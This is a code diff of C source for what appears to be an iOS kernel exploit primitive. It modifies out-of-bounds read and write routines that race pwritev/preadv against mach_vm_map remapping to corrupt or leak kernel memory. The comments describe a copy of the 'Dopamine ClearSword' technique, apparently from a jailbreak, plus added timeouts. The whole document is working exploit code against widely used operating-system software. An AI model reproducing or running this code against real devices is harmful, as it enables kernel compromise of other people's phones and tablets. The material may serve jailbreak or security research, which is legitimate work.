@@ -43,6 +43,52 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
 
     // set iov base to physically contiguous addr + 0x3f00
     cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
+
+    /* OG lane: Dopamine ClearSword verbatim. iov_len = offset+size, HIT only
+       on pwritev EFAULT (w == -1) followed by pread; first qword marker
+       comparison. The only lab addition is the 300 s deadline so a failed
+       train returns instead of spinning forever. */
+    if (!cs2_ctx.copy_confusion_lane) {
+        cs2_ctx.iov.iov_len = (size_t)(offset + size);
+        memcpy(buffer, &cs2_ctx.random_marker, sizeof(uint64_t));
+        for (uint64_t try_idx = 0;
+             try_idx < (cs2_ctx.highiest_success_idx + 100ull); try_idx++) {
+            if (cs2_expired()) {
+                LOG_ERR("OG lane budget expired (try=%llu) — honest failure",
+                        (unsigned long long)try_idx);
+                return KERN_FAILURE;
+            }
+            atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
+            ssize_t w = pwritev(cs2_ctx.read_fd, &cs2_ctx.iov, 1, 0x3f00);
+            while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1) {
+                if (cs2_expired()) return KERN_FAILURE;
+            }
+            mach_vm_address_t map_addr = cs2_ctx.pc_address;
+            kern_return_t kr = mach_vm_map(mach_task_self(), &map_addr, cs2_ctx.pc_size, 0,
+                                           VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                                           cs2_ctx.pc_object, 0, false,
+                                           VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+            if (kr != KERN_SUCCESS) {
+                LOG_ERR("OG oob_read mach_vm_map: %s (%d)", mach_error_string(kr), kr);
+                return KERN_FAILURE;
+            }
+            if (w == -1) {
+                pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset);
+                uint64_t marker = 0;
+                memcpy(&marker, buffer, sizeof(marker));
+                if (marker != cs2_ctx.random_marker) {
+                    cs2_ctx.success_read_count++;
+                    if (try_idx > cs2_ctx.highiest_success_idx)
+                        cs2_ctx.highiest_success_idx = try_idx;
+                    atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0,
+                                          memory_order_seq_cst);
+                    return KERN_SUCCESS;
+                }
+            }
+        }
+        atomic_store_explicit(&cs2_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
+        return KERN_FAILURE;
+    }
     /* Two capture lanes (24A435 recovered TAP 2026-11-04):
          OG / A13 18.x: iov_len = 0x1000, HIT only when pwritev EFAULT (w==-1)
            then pread. That is Dopamine ClearSword verbatim.
@@ -263,11 +309,11 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
 
 // retry until success
 void cs2_oob_read_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer) {
-    while (true) {
+    /* Upstream retries forever; the app must end. The deadline is the only
+       addition here. */
+    while (!cs2_expired()) {
         kern_return_t kr = cs2_oob_read(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
-        if (kr == KERN_SUCCESS) {
-            break;
-        }
+        if (kr == KERN_SUCCESS) break;
     }
 }
 
@@ -283,10 +329,13 @@ void cs2_oob_write(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, ui
     pwrite(cs2_ctx.write_fd, buffer, size, 0x3f00 + offset);
 
     for (uint64_t try_idx = 0; try_idx < 20; try_idx++) {
+        if (cs2_expired()) break;
         atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
         // write from the fd into (oob) memory
         preadv(cs2_ctx.write_fd, &cs2_ctx.iov, 1, 0x3f00);
-        while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1);
+        while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1) {
+            if (cs2_expired()) break;
+        }
 
         mach_vm_address_t map_addr = cs2_ctx.pc_address;
         kern_return_t kr =
